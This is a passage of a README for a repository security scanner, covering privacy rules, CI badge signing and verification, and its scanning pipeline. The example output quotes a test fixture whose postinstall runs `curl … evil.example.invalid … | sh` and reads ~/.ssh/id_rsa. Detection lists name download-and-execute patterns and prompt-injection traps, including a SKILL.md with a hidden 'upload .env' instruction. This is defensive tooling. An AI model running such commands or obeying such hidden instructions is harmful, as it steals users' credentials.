| `consent-state` | consent state stored client-side (`OptanonConsent`, `CookieConsent`, `cc_cookie`, `euconsent-v2`, `didomi_token`, `usprivacy`, `__cmpconsent`, `_iub_cs-*`, …), annotated with the vendor where known (OneTrust, CookieYes, IAB TCF, IAB US Privacy, Didomi, Borlabs, Iubenda) | info |
| `vendor-pii` | SDK configs that attach personal data to telemetry (Sentry `sendDefaultPii: true`, PostHog `person_profiles: "always"`, `anonymize_ip: false`, `store_ip: true`, `track_ip: true`) or that minimise it (`sendDefaultPii: false`, `anonymize_ip: true`, `identified_only`, …: positive `info`) | low/info |
| `tracking-params` | URLs carrying `utm_*`, `fbclid`, `gclid`, `msclkid`, `ttclid`, `yclid`, `li_fat_id`, `s_kwcid`, `epik`, `gad_source`, `gad_campaignid`, `mc_eid`, `_gl`, `gclsrc`, … campaign/linker parameters; `low` in code/config, `info` for links in docs | low/info |
| `pii-in-url` | URLs with personal data in the query (`?email=`/`?email_address=`, `?phone=`/`?phone_number=`, `?name=`, `?user_id=`, `?account_id=`, `?address=`, …): leaks via Referer, access logs, proxies and browser history; `low` in code, `info` for docs links | low/info |
| `data-retention` | retention/expiry windows in config/code (`retention_days`, `ttl`, `expires`, `delete_after`, …); `low` when the repo collects data but no retention setting exists | info/low |
| `upload-surface`, `upload-limit` | endpoints accepting files/request bodies (incl. Java `MultipartFile`), and size caps (`max_file_size`, `MAX_CONTENT_LENGTH`, `client_max_body_size`, `LimitRequestBody`, `limits:`/`limit:`, …); `low` when uploads have no cap | info/low |
| `store-disclosure` | browser-extension data-collection declarations (Firefox `data_collection_permissions`); info when disclosures only exist on the store | info |
| `referrer-policy` | `Referrer-Policy` header, `<meta name="referrer">`, `referrerpolicy=` attributes, `fetch(..., {referrerPolicy})` or `rel="noreferrer"`; `low` when third-party requests exist without one or with `unsafe-url` (the full URL leaks in `Referer`) | info/low |
| `permissions-policy` | `Permissions-Policy` header; `low` when camera/microphone/geolocation/screen/clipboard APIs are used without one | info/low |
| `privacy-doc` | `info` when a privacy policy/manifest exists anywhere in the repo (`PRIVACY.md`, `docs/privacy-policy.md`, `PrivacyInfo.xcprivacy`, …) or the README links an external policy; `low` when data leaves the repo but no policy is shipped or linked | info/low |
| `undisclosed-vendor` | detected telemetry vendors that are not named in any README/privacy doc, when the repo ships one | info |
| `submodule-unpinned` | `.gitmodules` entry tracking a branch/tag ref (`branch = …` that is not a 40-character commit SHA): the recorded commit is ignored by `--remote` updates and the content drifts | low |
| `submodule-host` | `.gitmodules` entry whose host differs from the repository's origin host (read from `.git/config`): the submodule is pulled from another host, a pivot you did not review here | medium |
| `submodule-uninspected` | one `info` finding listing the `.gitmodules` entries: fetch runs with `--no-recurse-submodules`, so only `.gitmodules` was inspected, not the submodule code | info |
| `dockerfile-base-unpinned` | `FROM` without a version tag or `@sha256:` digest, or with the floating `latest` tag (`scratch`, `${ARG}` images and multi-stage aliases are skipped): the base image can change under you | low |
| `custom-check` | findings from `custom_checks` in `.repobeagle.yml` (paths + regex + severity + meaning; capped at 20 matches per check) | configured |
| `commit-unsigned`, `tag-unsigned` | default-branch HEAD / latest tag points at a commit without a verified GitHub signature (unsigned is the norm; `info`) | info |
| `commit-unassociated` | the default-branch commit author email is not linked to a GitHub account | low |
| `release-immutable`, `release-mutable` | the latest GitHub release is (or is not) immutable: a mutable release tag/assets can be replaced | info/low |
| `fork-drift`, `fork-synced` | the repo is a fork: "N commits ahead, M files changed vs upstream" (`low`), or no commits ahead (`info`) | low/info |
| `dependency-confusion` | `pip --extra-index-url` (requirements files, pip config), plaintext npm registry (`.npmrc registry=http://`) or `http://` dependency tarballs, and yarn `resolutions`/npm `overrides`: a dependency can resolve from a lookalike index or have its version forced | medium/low |

Findings from the `privacy`/`telemetry` checks have their snippets **and titles redacted by default** (emails `s***@domain`, cards `4111 **** **** 1111`, phones `+46 ***** 567` and `(415****132`, SSNs `***-**-6789`) so a published badge report does not republish the PII it found. The report prints a redaction notice when it applies, `verify` prints `snippets: redacted by scanner` (or `raw`), `--no-redact` shows raw values and `meta.pii_redacted` records the mode.

Component sources (`.jsx`, `.tsx`, `.vue`, `.svelte`, `.astro`) are scanned like JavaScript for endpoints, scripts, media and imports; HTML pages count as runtime (only markdown/text docs, tests and translations are demoted). Tags split across lines (`<img\n src=…`, `<link\n rel=stylesheet href=…`) are attributed to the nearest opening tag, and `<link>` rel/href are parsed in any attribute order. Test fixtures and fake hosts (`example.com`, single-label names, private ranges) are excluded or downgraded so the checks don't drown a verdict in noise; files over 2 MB are skipped for telemetry/privacy (generated/minified). `target/` build output is skipped like `dist/` and `build/`.

`repobeagle verify` prints the same counts line (`privacy: trackers N, pii N, …`) and the declared scope (`full`/`only`/`excluded`), warning if the findings contradict `meta.privacy_mode`, the stored `privacy_summary`, the stored verdict/counts, or `meta.ruleset` differs from the scanner, from the signed report, so a badge consumer sees the privacy profile without downloading the JSON. `badge.json` also carries a `privacy` object with those counts (extra keys are ignored by shields.io and available to any API consumer). The report prints a one-line `Privacy profile` (tracker vendors, third-party hosts, PII items, permission scopes, consent signals, identity-sharing calls) before the detailed summary. Report and `--json` output add a one-line `meta.privacy_profile` and a structured `privacy_summary` grouping what was found by kind (trackers by telemetry kind and vendor, PII incl. IP logging, permissions incl. browser capabilities, fingerprinting, storage/cookies incl. import-time writes, consent, vendor configs, first-party vs third-party network signals incl. import-time requests and tracking params, replay masking, identity, retention, uploads, transparency) so you can see *what kinds* a repo has without reading every finding. Suppressed findings are excluded from it and counted separately.

### Suppressing reviewed findings

If you reviewed a finding and accept it, add a `.repobeagleignore` at the repo root. One entry per line, `rule [# reason] [@YYYY-MM-DD]`; bare rule ids and globs stay valid:

```
# comments are ignored
Download-and-execute  # installer is pinned by tag
telemetry-devtool  # analytics loads only after consent @2026-12-31
pii-*  # reviewed by the privacy team, revisit at the next audit
```

Add or update entries with `repobeagle ignore <rule> --reason "…" --until YYYY-MM-DD [--file FILE]` (an existing entry for the same rule is updated in place, not duplicated); `repobeagle ignore --list` shows each entry with its status, and `--report r.json` refuses a rule that matches no finding so a typo cannot silently suppress nothing.

Matching findings stay in `--json` with `"suppressed": true` plus `"suppression": {rule, reason, until, line, status}`, `meta.suppressed` counts them (kept as a number for compatibility) and `meta.suppressions` lists every parsed entry as `{rule, reason, until, status, line}`. Suppressed findings are removed from the verdict and the printed report, and the AI review does not see them.

Lifecycle: an entry with `@date` stops suppressing after that date. The finding comes back active, the report notes `suppression for <rule> expired on <date>; finding re-activated`, `meta.suppressions[].status` becomes `expired`, and an expired match carries `suppression_expired` on the finding. A malformed date keeps the entry active and is warned about, so a typo never silently unsuppresses. Expiry depends on the clock: `BEAGLE_TODAY=YYYY-MM-DD` pins it (tests, airgapped runs, reproducible reports). Suppression is opt-in per repo and never changes what is scanned.

## Badge your repo

Run the scanner on every push and show the verdict in your README. Add this workflow (it installs repobeagle, scans your repo with the pinned image, publishes the badge and sets a `repobeagle/scan` commit status):

```yaml
# .github/workflows/repobeagle.yml
name: repobeagle
on:
  push:
    branches: [main]
    tags: ["v*"]
jobs:
  scan:
    permissions:
      contents: write   # publishes the repobeagle badge branch (optional)
      statuses: write   # sets the repobeagle/scan commit status (optional)
      id-token: write   # required: keyless-signs the report with Sigstore
      security-events: write  # only for upload-sarif (GitHub code scanning)
    uses: javierbits/repobeagle/.github/workflows/scan.yml@main
    with:
      profile: balanced   # strict | balanced | relaxed
      fail-on-red: false  # true = the job fails on a RED verdict (PR gate)
      privacy-only: false # true = publish a privacy-audit verdict
      upload-sarif: false # true = publish findings to GitHub code scanning (add security-events: write)
```

Then add the badge; after a tag push, a per-tag badge also exists:

```markdown
![RepoBeagle](https://img.shields.io/endpoint?url=https://raw.githubusercontent.com/OWNER/REPO/repobeagle/badge.json)
![RepoBeagle v1.166.0](https://img.shields.io/endpoint?url=https://raw.githubusercontent.com/OWNER/REPO/repobeagle/badge-v1.166.0.json)
```

The workflow publishes a `repobeagle` branch containing `badge.json` (shields.io endpoint), a self-hosted `badge.svg` fallback and the full `report.json` (plus `report-<sha>.json` per commit and per-tag copies), so every finding is one click away from the badge. Inputs: `profile`, `fail-on-red`, `baseline` + `baseline-min-severity` (gate on new findings, see below), `privacy-only`, `badge-branch` (empty string disables publishing), `set-status` (default true), `upload-sarif` and `tools-ref` (toolchain ref, default `main`; the `VERSION` file there pins the scanned image). `upload-sarif: true` needs `security-events: write` in the caller job and publishes the findings to GitHub code scanning with stable `partialFingerprints`, so repeat scans dedupe instead of piling up.

Manual upload (any CI, no workflow input needed):

```bash
repobeagle scan <target> --json report.json
repobeagle export report.json --format sarif -o repobeagle.sarif
```

then upload `repobeagle.sarif` with `github/codeql-action/upload-sarif@v3` (GitHub) or any SARIF 2.1.0 consumer (Azure DevOps, VS Code SARIF viewer, GitLab's analyzer upload). The exporter is validated against the vendored official OASIS schema (`tests/schema/sarif-schema-2.1.0.json`) in `ci.yml`, and `.github/workflows/sarif.yml` proves the GitHub path end to end: export a fixture, upload twice, and assert the second upload does not duplicate alerts.

### Set it up with `repobeagle init`

```bash
repobeagle init                    # writes .github/workflows/repobeagle.yml and prints the shield lines
repobeagle init --dry-run          # print the workflow, write nothing
repobeagle init --profile strict --fail-on-red --upload-sarif ...
```

`init` templates the reusable workflow from its inputs (`profile`, `fail-on-red`, `privacy-only`, `badge-branch`, `set-status`, `tools-ref`) and the caller permissions the reusable workflow requires (`contents`, `statuses`, `id-token`, `security-events` — GitHub validates the intersection at startup), pins the toolchain to the current release tag (bump it together with the tool), uses the origin remote to print the exact shields.io line for your repository, refuses to overwrite a differing file without `--force`, and is a no-op when the file is already current. The generated workflow is exactly what this repository runs for its own badge (`.github/workflows/self-scan.yml`), which also exercises the signing and `verify` path on every release.

### Verifying a badge (public repos)

The badge is produced by the author's own CI, so on its own it is self-attested. The workflow therefore signs the report with Sigstore keyless signing and publishes the bundle as `report.sigstore.json` next to `report.json` on the badge branch. The signing certificate's identity is this repo's own reusable workflow (`javierbits/repobeagle/.github/workflows/scan.yml`), which callers cannot edit, so a valid signature means the official pipeline scanned that commit and the report was not swapped afterwards. To verify a badge: `verify` installs cosign to `~/.local/bin` on first use if it is missing (`./install.sh` also installs it).

```bash
repobeagle verify javierbits/javierbits.github.io
#   signature: VALID  policy: official scan/service/index workflow (main or v* tag)
#   report:    YELLOW  0 critical / 6 high / 1 medium / 56 low
#   scanned:   a7cb435002de at javierbits/javierbits.github.io (image ghcr.io/javierbits/repobeagle:v1.166.0)
#   snippets:  redacted by scanner
#   scope:     full
#   freshness: UP TO DATE (HEAD a7cb435002de)
```

Exit codes: 0 = signature valid and report covers HEAD, 1 = invalid signature or missing report, 2 = valid but stale (report is older than HEAD, or older than `--max-age`), 3 = `--rescan` normalized findings differ from the signed report. Local files work too: `repobeagle verify --report report.json --bundle report.sigstore.json`.

`--max-age 30d` makes freshness a policy instead of a comparison: a signed report older than that exits 2 even when HEAD has not moved, because a months-old scan is evidence about months-old code. Reports without `meta.scanned_at` are stale under a policy (a negative must never read as valid); without `--max-age` the default stays unlimited for compatibility. `verify` prints the scan age when the report records it (`scanned: … · 40d old`), and the badge endpoint/SVG carry the same age (`YELLOW · 40d`, extra `age` field for API consumers) when the report has `meta.scanned_at`. A report signed by `serve --sign --key <private key>` (and not by a GitHub workflow) verifies with `--key cosign.pub`; the tlog check is skipped for key-signed reports because a local key has no public transparency-log identity. Add `--rescan` to re-scan the report's pinned commit with your install and compare the normalized core (timings and the host-side OSV/trust stages excluded, see [Determinism](#determinism)). What it runs under the hood:

```bash
cosign verify-blob \
  --bundle report.sigstore.json \
  --certificate-identity-regexp '^https://github\.com/javierbits/repobeagle/\.github/workflows/(scan|service)\.yml@refs/(heads/main|tags/v[0-9]+\.[0-9]+\.[0-9]+)$' \
  --certificate-oidc-issuer https://token.actions.githubusercontent.com \
  report.json
```

What this does and does not prove:
- Proven: an official workflow (scan on the badge branch, or `serve` for its own reports) signed exactly this report. The report records `meta.image_digest`, `meta.toolchain_ref`, the run URL, the scanned SHA and the scanned repository; a report produced for any other repository is rejected. The offline scan is deterministic, so anyone can re-run the pinned image on the same commit and diff the findings.
- Not proven: that the branch tip is still that commit. A repo owner can republish an old, honestly-green report next to new code; always check `meta.scanned_sha` against HEAD. A missing or failing signature means unverified, never verified. Badges also only make sense on public repos: on a private one nobody can see the README or the report. For an independent verdict, run the scan elsewhere yourself: `repobeagle serve` is the same attestation service over HTTP (or use a hosted deployment of it).

### Gate on new findings instead of the absolute verdict

`fail-on-red` fails on any RED, which on a large honest repository means the day it is enabled. The diff gate inverts that: fail only on what the change introduced. Matching is on rule id + file, so line moves and re-indentation are not changes.

- Your own baseline: `repobeagle scan <target> --json candidate.json --baseline baseline.json --baseline-min-severity high` (one command, exit 1 only on new findings), or separately `repobeagle diff baseline.json candidate.json --min-severity high`.
- With this workflow: `baseline: true` and `baseline-min-severity: high`. Before scanning, the job clones the badge branch and copies its `report.json` — the last published report, byte-identical to the newest `report-<sha>.json` — as the baseline. It then scans, publishes the new report and the commit status, and only then runs the same diff, failing when the candidate has a finding at/above the threshold that the baseline did not. The first run on a repository has no baseline and skips the gate; `badge-branch: ''` disables publishing and therefore the gate.

What this gate does **not** catch:
- **Severity changes on the same rule + file**: the key is unchanged, so `low` → `critical` is not a new finding. Gate on the absolute verdict, or compare severities yourself, if that matters.
- **Rule renames** (warned about via the ruleset line, then compared as different ids) and a finding that moves file (it appears as removed + added, noisy but not silent).
- A baseline that hides the regression: an older baseline, a different profile (`--strict`/`--relaxed`), `--privacy-only`, or one produced by a different toolchain. The report records `meta.profile`, `meta.ruleset`, `meta.tools` and `meta.scanned_sha`, so compare those when a result surprises you; `diff` warns on profile and ruleset mismatches, but the baseline gate does not fail for them.
- A skipped gate: with `baseline: true` the job passes when the badge branch has no `report.json` yet, or when the baseline clone fails (`continue-on-error`). The log says which; the commit status and the published report are still fresh.
- New code inside binaries or archives (never inspected), git history beyond the shallow clone, and anything that only happens at runtime.

Retention: the badge branch keeps every `report-<sha>.json` and per-tag copy; nothing prunes them yet, and every scan adds one blob. The baseline is always the newest `report.json`, so a long-lived badge branch accumulates objects — prune old `report-*.json` if that matters to you, or set `badge-branch: ''` (which drops the history and the gate).

## Pipeline
1. **Fetch** always uses a filtered checkout, so huge repos stay small. It runs `git clone --depth 1 --filter=blob:none --no-checkout --no-recurse-submodules`, lists files with `git ls-tree`, then does a sparse checkout that **excludes archives and binaries**. Those files are reported as findings but never downloaded. For example, DataDog's ~44 GB malware dataset comes down as ~250 MB in about 17 s. The checkout goes into a fresh temp dir (mode 0700), with these protections: `GIT_TERMINAL_PROMPT=0`, `core.hooksPath=/dev/null`, `core.symlinks=false`, `protocol.file.allow=never`, `GIT_ALLOW_PROTOCOL=https:http:ssh`, no credential helper, and LFS smudge skipped. A local directory is copied instead, without `.git`. The copy is deleted at the end unless you pass `--keep`.
2. **Offline scanners** run in `docker run --rm --network none --read-only --cap-drop ALL --security-opt no-new-privileges --user <you, non-root>` with the clone mounted **read-only** and no home directory or credentials mounted. If Docker or the image is missing, or you pass `--no-docker`, they run locally on the temp folder.
   - **gitleaks** `detect --no-git` (redacted). Hits in test/docs paths are downgraded.
   - **Semgrep** with `rules/custom.yml` (decode-and-exec, download-and-run, child_process curl, dangerous C string functions, weak Go crypto, SQL string concatenation, Dockerfile last-USER-root).
   - **GuardDog** source scan of the local package (pypi and/or npm if the repo root has a manifest). `capability-*` rules count as low and `threat-*` rules as high.
   - **Bandit** static analysis of Python sources (shell=True subprocess, yaml.load, asserts in shipped code, hardcoded passwords). Hits in test/docs paths are downgraded.
   - **Agent checks** (pure Python, stdlib):
     - Invisible and bidi Unicode (zero-width, U+202A–202E, U+2066–2069, tag chars U+E0000–E007F). Hidden tag text is decoded and shown.
     - Prompt injection in README, SKILL.md, AGENTS.md, CLAUDE.md, .cursor rules, *.mdc and prompt files, including inside HTML comments.
     - Hidden markdown in every .md/.mdx: HTML comments, `<details>` blocks, image alt/title text, CSS-hidden text and whitespace-padded lines carrying agent or exfil wording.
     - **MCP tool poisoning**: `<IMPORTANT>` blocks, concealment wording and secret reads inside MCP tool descriptions or docstrings.
     - Reading ~/.ssh, .env, cloud creds, browser cookies or wallets near a network sink.
     - MCP/plugin manifests that grant a shell, `/` or home filesystem access, `*` or `Bash(*)` permissions, `dangerously*` flags, remote servers or `npx -y`.
     - Install hooks: npm pre/post/install, setup.py cmdclass and os.system, pyproject build hooks, devcontainer commands, VS Code folderOpen tasks, git hooks, Makefile.
     - Download-and-execute patterns: `curl|sh`, `wget|bash`, `base64 -d|sh`, eval/exec of decoded blobs, large base64 blobs.
     - Prebuilt binaries, and archives. Archives are **never extracted**: zip headers are read to spot password-protected or encrypted samples, which are flagged as uninspectable.
     - Build-time code beyond npm: setup.cfg/build.py/hatch_build.py fetch or subprocess, `build.rs`, `//go:generate` with curl/sh, node-gyp actions, unknown pyproject `build-backend`, curl/base64/nc in Makefile/justfile.
     - GitHub Actions: pwn-request (`pull_request_target`/`workflow_run` + PR head checkout), other privileged triggers, secrets echoed, `curl|sh`, write permissions, actions not pinned to a commit SHA.
     - Executables disguised by extension (magic-byte mismatch, e.g. an ELF named `.png`), high-entropy blobs (Shannon > 5.2), minified JS outside build/dist paths.
     - Typosquatted dependencies (npm, PyPI, crates) one edit away from popular packages.
     - **Telemetry/privacy**: known analytics, session-replay, ad-pixel, crash-reporting, APM and OTEL vendors (endpoints and SDK imports) with the kind in the rule name (`telemetry-analytics`, `telemetry-session-replay`, `telemetry-ads`, `telemetry-crash`, `telemetry-apm`, `telemetry-devtool`). Lockfiles (npm, PyPI, Cargo, Go, Composer, RubyGems, Pipenv, pub, Hex, SwiftPM, NuGet) yield one low `(transitive)` finding per vendor pinned only as a dependency, using the same vendor set (analytics platforms incl. Heap/Countly/Pendo/Optimizely/VWO/HubSpot/Klaviyo/Braze/OneSignal/Customer.io/Tealium/Mailchimp/Intercom); one finding per direct vendor with the first `file:line` and hit count, plus whether the repo mentions an opt-out (`DO_NOT_TRACK`, `NEXT_TELEMETRY_DISABLED`, `telemetry: false`, …).
3. **OSV-Scanner** runs **on the host, outside the sandbox**, because the vulnerability DB is online. It only reads lockfiles and manifests from the clone and sends package names and versions to osv.dev. `--no-osv` skips it. (Offline mode `--offline-vulnerabilities --download-offline-databases` is a possible later improvement.) It also catches `MAL-` malicious-package advisories.
4. **Trust and provenance signals** (host, GitHub API, `--no-trust` skips): repo younger than 30 days, owner younger than 90 days, ≥500 stars in <60 days, ≥200 stars with one contributor, renamed/transferred repos; plus provenance — default-branch commit signature (`commit-unsigned`, info: unsigned is the norm), committer association (`commit-unassociated`, low: the commit email is not linked to a GitHub account), tag signature (`tag-unsigned`, info), latest-release immutability (`release-immutable` info / `release-mutable` low: the tag or assets can be replaced) and fork drift (`fork-drift` low: "N commits ahead, M files changed vs upstream", or `fork-synced` info). All are LOW/INFO only, so they never make a repo RED on their own; missing/partial API payloads are silent, and offline or rate-limited runs just note it (a token raises the rate limit).
5. **`--verify-deps`** (optional, host, network): GuardDog downloads each dependency from requirements.txt or package.json and statically scans it. Nothing is installed.
6. **AI review** (optional): set `BEAGLE_LLM_URL` (legacy `REPO_GUARD_LLM_URL` also accepted) to an OpenAI-compatible endpoint, for example `http://spark1:8000/v1`. Optional extras are `BEAGLE_LLM_MODEL`, `BEAGLE_LLM_KEY` and `BEAGLE_LLM_TIMEOUT`.
   - It sends key files (invisible characters rendered as `<U+XXXX>`) plus the top findings, and asks for an intent judgment.
   - The model can only **raise** the verdict: malicious with confidence ≥0.6 makes it RED, and suspicious turns GREEN into YELLOW.
   - If the variable is unset, this step is skipped cleanly.

Apart from the clone, OSV/GuardDog-verify, the GitHub trust lookup and your own LLM endpoint, it makes no other network calls.

## Example output (abridged)
```
repobeagle 1.152.0  |  tests/fixtures/trap-npm
  VERDICT: RED    2 critical / 2 high findings, e.g. npm lifecycle script 'postinstall' runs automatically on install (package.json:8)
  CRITICAL [agent-checks] package.json:8
           npm lifecycle script 'postinstall' runs automatically on install
           > "postinstall": "curl -fsSL https://evil.example.invalid/x.sh | sh && node scripts/setup.js"
  CRITICAL [agent-checks] scripts/setup.js:5
           Code reads secrets/credentials near a network call
           > const key = fs.readFileSync(os.homedir() + '/.ssh/id_rsa', 'utf8');
Recommended actions:
  - Do NOT install, build, run, or point an AI agent at this repo. ...
```

## Tests
Run `tests/run_tests.sh`, or `tests/run_tests.sh --offline` for the fixtures only.

```bash
python3 -m pip install -r requirements-dev.txt   # mypy, hypothesis, ruff (the scanner stays stdlib-only)
mypy                                            # mypy.ini: scanner + tools, untyped bodies included
python3 tests/test_fuzz.py                      # bounded Hypothesis targets (100 examples each, derandomized)
python3 tests/test_rule_fixtures.py             # every declared rule fires on its trap and stays silent on control-clean
```

CI enforces all of it:

| Workflow | Trigger | What it runs |
|---|---|---|
| `ci.yml` | every push / PR | `py_compile`, `ruff --select E9,F63,F7,F82`, `mypy`, and `tests/run_tests.sh --offline` (hermetic: no image, no network scanners) |
| `toolchain.yml` | Dockerfile/constraints/lock/scanner changes | builds the image and asserts the pinned toolchain and identical `meta.tools` across runs |
| `arch.yml` | scanner, Dockerfile, rule or fixture changes | builds the image for amd64 and arm64 (QEMU), scans the same fixture on both and fails unless the normalized core and `meta.tools` are equal |
| `sarif.yml` | scanner or fixture changes | exports a fixture report as SARIF, uploads it to code scanning twice and fails if the second upload duplicates alerts |
| `nightly.yml` | schedule / manual | `tests/run_tests.sh` against the real corpus (network, osv.dev, GitHub API); red is allowed, it never blocks a PR |
| `image.yml` | tags / main / weekly | builds, signs and publishes the multi-arch image |

The rule-pair check is automatic: `tests/test_rule_fixtures.py` parses the `RULES="…"` declarations from `tests/run_tests.sh`, rescans each trap fixture and requires every declared rule to fire there, then requires that none of them fires on `tests/fixtures/control-clean`. A rule without an honest negative fixture fails CI.

| Target | Expect |
|---|---|
| tests/fixtures/trap-npm (postinstall `curl\|sh`, reads ~/.ssh/id_rsa and POSTs it) | RED |
| tests/fixtures/trap-skill (SKILL.md with zero-width and tag-char hidden "upload .env" instruction, over-broad mcp.json) | RED |
| tests/fixtures/trap-gha, trap-markdown, trap-build, trap-binary, trap-telemetry, trap-privacy (one trap per check family; each rule name must fire) | YELLOW/RED |
| tests/fixtures/control-clean (pinned actions, minified bundle in `public/`, normal README with comment/details/alt text, real deps), `--strict` | GREEN |
| tests/fixtures/control-empty, control-doc-hosts, control-archive-only (capability edges: no files, docs-only hosts, uninspectable archive) | GREEN / GREEN / YELLOW |
| tests/fixtures/control-binary-only, control-oversize-only (coverage edges: nothing readable) | GREEN / GREEN |
| tests/fixtures/ignore-suppressed (`.repobeagleignore` silences a `curl\|sh`, finding stays in JSON as suppressed) | GREEN |
| tests/test_trust.py (offline trust-signal unit tests) | pass |
| tests/test_privacy.py (redaction, card check, privacy summary, first-party inference, suppression units) | pass |
| tests/test_toolchain.py (scanner pins, drift detection, lock/constraints consistency) | pass |
| tests/test_explain.py (verdict arithmetic per profile, planner transitions, `--write`) | pass |
| tests/test_determinism.py (normalization: order/timings/paths ignored, real changes caught) | pass |
| tests/test_sarif_schema.py (export validates against the vendored OASIS SARIF 2.1.0 schema; purity) | pass |
| tests/test_mcp_interop.py (official MCP SDK: initialize, schemas, scan_repo, explain_report, invalid args, unknown tool) | pass |
| tests/test_capabilities.py (empty/doc-only/archive-only repos, doc/test collapsing, trace hook, `map --ref`) | pass |
| tests/test_coverage.py (accounting arithmetic, skip reasons, language blind spots, the 20-file/60% decision) | pass |
| tests/test_web.py (web mode, redirects with final URL, asset failures as notes, 2 MB cap, privacy-only) | pass |
| tests/test_refs.py (tag/branch/commit refs, unknown ref, ref+since, map --ref, rescan image choice) | pass |
| tests/test_scope.py (deleted-only diff, renames, context files, empty diff, badge/MCP scope surfacing) | pass |
| tests/test_remediation.py (rule-id lookup, coverage audit, wording rules, Markdown/SARIF surfacing) | pass |
| tests/test_osv.py (missing DB note, freshness policy, corrupt zip, verify warning) | pass |
| tests/test_packaging.py (console script, wheel data files, packaged rules/version fallback, installer OS support) | pass |
| tests/test_fix.py (dry-run immutability, action pinning, write-all rewrite, idempotence, re-scan improvement) | pass |
| tests/test_head.py (local triage, mocked contents API, cache/TTL, token, rate-limit notes, markdown card) | pass |
| tests/test_suppressions.py (grammar, expiry re-activation and warnings, meta.suppressions, `ignore` add/update/list/validate) | pass |
| tests/test_init_html.py (`init` template/shields/idempotence/--force/remote slug, HTML escaping and self-containment) | pass |
| tests/fixtures/control-vuln (`flask==2.0.0`), used by the cached offline-OSV CI/nightly scan | vulnerable dependency from the local DB |
| tests/test_markdown_snapshot.py (PR-comment snapshot, pipe/newline escaping, suppression, truncation) | pass |
| tests/test_rule_fixtures.py (positive fixture fires every declared rule; control-clean fires none) | pass |
| tests/test_fuzz.py (bounded Hypothesis targets: `decode_tags`, `redact_pii`, `check_unicode`, `check_markdown_hidden`) | pass |
| psf/requests, tj/commander.js | GREEN/YELLOW |
| invariantlabs-ai/mcp-injection-experiments | RED (MCP tool poisoning / exfil instructions) |
| juice-shop/juice-shop | YELLOW (control: intentionally vulnerable code, not malicious) |
| DataDog/malicious-software-packages-dataset | YELLOW: about 29.7k malware-sample zips are listed via ls-tree and flagged as uninspectable. They are never downloaded or extracted. |

## Toolchain pins and reproducibility
The image installs exactly what `constraints.txt` pins, through `requirements.lock`: a universal `uv` lock carrying a SHA-256 for every wheel of every transitive dependency of semgrep, guarddog and bandit. `Dockerfile` installs it with `pip install --require-hashes`, so a weekly rebuild cannot resolve a newer dependency tree than the reviewed one. gitleaks is a release tarball pinned by `ARG GITLEAKS_VERSION` in the same `Dockerfile` and verified against `checksums.txt`; the base image is pinned by multi-arch digest. A report records what actually ran in `meta.tools`; `verify` warns when a stored report's scanner versions differ from these pins, and the `toolchain` workflow rebuilds the image and fails if `meta.tools` disagrees with the pins or changes between two runs of one build.

To bump a scanner, do all of this in one PR:

1. Update the version in `constraints.txt` (pip scanners) or `ARG GITLEAKS_VERSION` (gitleaks), and the matching `install.sh`/`checksums.txt` lines for downloaded artifacts.
2. Regenerate the lock:
   ```bash
   uv pip compile --universal --generate-hashes --python-version 3.12 \
     --no-header --no-annotate --no-emit-index-url constraints.txt -o requirements.lock
   ```
3. `./install.sh --build-local`, then scan `tests/fixtures/trap-npm`: it must stay RED and `meta.tools` must name the new versions.
4. Bump `VERSION` and push the tag; `image.yml` builds amd64+arm64, signs the image and publishes it.

## Determinism
The same commit, scanned offline by the same image digest, produces the same normalized report core: findings (`tool`, `severity`, `rule`, `file`, `line`, `title`, `meaning`, `snippet`, suppression state, `remediation`), the scanner versions, capabilities and coverage, sorted by a total key and hashed with SHA-256. **Not** part of the comparison: timings, the scan target path, dict/list insertion order, and the host-side OSV/GitHub-trust stages (network, they change by day). This is what makes a signed report meaningful: `arch.yml` builds the image for amd64 and arm64, scans `tests/fixtures/trap-privacy` on both, and fails unless the normalized core and `meta.tools` are equal; `verify --rescan` re-scans the report's pinned commit with your install (offline stages only) and exits 3 when the core differs. A reordering is ignored by design, and `tests/test_determinism.py` proves the comparison stays order-insensitive while still catching field changes, added/removed findings and toolchain bumps.

Scope: the guarantee covers the offline scanner stages on one commit and one image digest. It does not cover osv.dev or the GitHub trust API (network), a different commit/ref than the one recorded, or `--verify-deps` (it downloads dependency packages).

**Comparability and the image caveat.** Two reports are comparable when `meta.commit` (or the pinned `meta.ref`→`meta.commit`) and the image digest/`meta.tools` are the same; that is what makes `verify --rescan` meaningful. `--rescan` re-scans `meta.scanned_sha` with the report's own `meta.image_ref` when the workflow recorded it — and warns if the locally resolved digest differs from `meta.image_digest` — otherwise it uses this install's image and says so explicitly. A tag can be republished to a different digest, so the digest is the anchor: reports record `meta.image_digest`, and `image_digest: unavailable` (local builds) means the tag is all you have.

## What it catches, and what it doesn't
**Catches**: obvious install-time payloads, credential theft patterns, hidden or invisible agent instructions, MCP tool poisoning, over-privileged agent configs, committed secrets, known-vulnerable or known-malicious dependencies, obfuscated loaders, dangerous C APIs, and weak Go crypto or injectable SQL built by concatenation. Also flags **telemetry and trackers** (analytics, session replay, ad pixels, crash reporting, APM/OTEL, dev-tool and transitive dependency telemetry) and **privacy signals** (device fingerprinting, Android/browser-extension/macOS permissions, plaintext endpoints, cookie flags, IP logging, PII in logs/source, tracking parameters, consent managers, Do-Not-Track handling, iOS/macOS privacy manifests, missing privacy policy) so you know what a repo reports, to whom, and whether it documents an opt-out.

**Misses**:
- Well-obfuscated or novel logic, and payloads fetched at runtime from innocent-looking URLs.
- Malicious code inside binaries, and inside archives that sit *in* a repo (flagged, not expanded; pass the archive as the target or use `--release-assets` to inspect it). Anything in git history older than the shallow clone.
- Submodule *content*, which is not fetched: only `.gitmodules` is inspected (branch refs, host, uninspected count), so their code is not scanned.
- Clever natural-language injection that avoids the keywords (the optional AI review helps here).

Static analysis can't prove a repo is safe.

**False positives**: security tools and test suites can trigger credential and secret rules. Test and docs paths are downgraded, but YELLOW on big honest repos is normal. Specific context is now taken into account: comments that only mention a sensitive path are ignored; reading the repo's own `.env` is low (medium only next to a network call) while `.ssh`, wallets, cookies and cloud creds stay high/critical; `.github/` issue/PR template comments are info; module-scope network detection skips `import`/`from`/`export` lines; `.env` in a comment no longer triggers the credential rule.
